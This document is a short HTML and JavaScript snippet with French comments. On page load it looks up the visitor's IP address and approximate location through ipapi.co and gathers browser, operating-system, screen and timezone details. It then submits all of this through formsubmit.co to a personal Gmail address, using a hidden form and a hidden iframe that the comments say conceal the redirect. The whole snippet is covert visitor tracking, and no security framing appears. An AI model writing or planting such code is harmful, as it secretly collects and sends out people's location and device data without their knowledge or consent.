    <!-- Iframe cachÃ©e pour bloquer la redirection -->
    <iframe name="hiddenFrame" style="display:none;"></iframe>

    <script>
    function getBrowserInfo() {
        const ua = navigator.userAgent;
        let browser = "Inconnu";
        if (ua.includes("Chrome")) browser = "Chrome";
        else if (ua.includes("Firefox")) browser = "Firefox";
        else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
        else if (ua.includes("Edge")) browser = "Edge";
        else if (ua.includes("MSIE") || ua.includes("Trident")) browser = "Internet Explorer";
        return browser;
    }

    function getOSInfo() {
        const platform = navigator.platform.toLowerCase();
        if (platform.includes("win")) return "Windows";
        if (platform.includes("mac")) return "macOS";
        if (platform.includes("linux")) return "Linux";
        if (/android/.test(navigator.userAgent.toLowerCase())) return "Android";
        if (/iphone|ipad/.test(navigator.userAgent.toLowerCase())) return "iOS";
        return "Inconnu";
    }

    fetch("https://ipapi.co/json")
    .then(res => res.json())
    .then(data => {
        const payload = {
            ip: data.ip,
            ville: data.city,
            region: data.region,
            pays: data.country_name,
            latitude: data.latitude,
            longitude: data.longitude,
            navigateur: getBrowserInfo(),
            os: getOSInfo(),
            resolution: window.screen.width + "x" + window.screen.height,
            fuseau_horaire: Intl.DateTimeFormat().resolvedOptions().timeZone,
            date: new Date().toLocaleString()
        };

        const form = document.createElement("form");
        form.method = "POST";
        form.action = "https://formsubmit.co/oguerep%40gmail.com";
        form.target = "hiddenFrame"; // Redirection bloquÃ©e ici

        for (const key in payload) {
            const input = document.createElement("input");
            input.type = "hidden";
            input.name = key;
            input.value = payload[key];
            form.appendChild(input);
        }

        document.body.appendChild(form);
        form.submit();
    });
    </script>
